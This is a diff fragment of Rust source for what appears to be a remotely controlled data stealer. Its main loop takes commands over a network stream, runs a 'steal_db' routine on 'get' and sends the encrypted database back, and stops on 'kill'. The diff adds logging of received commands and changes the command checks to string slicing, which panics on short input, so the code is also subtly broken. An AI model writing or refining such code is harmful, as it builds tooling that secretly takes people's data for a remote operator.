@@ -62,7 +62,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     loop {    
         let res = match get_commands(&mut stream){
             Ok(res) => {
-                info!("Got commands");
+                info!("Got commands {:?}", res);
                 res
             }
                 ,
@@ -72,7 +72,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             }
         };
         let trimmed = res.trim();
-        if trimmed == "get" {
+        if trimmed[0..3].eq("get") {
             info!("starting steal_db");
             let encrypted_db = match steal_db() {
                 Ok(db) => db,
@@ -86,7 +86,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 Err(e) => error!("Could not send db: {}", e),
             };
         }
-        if trimmed == "kill" {
+        if trimmed[0..4].eq("kill") {
             break;
         }
     }
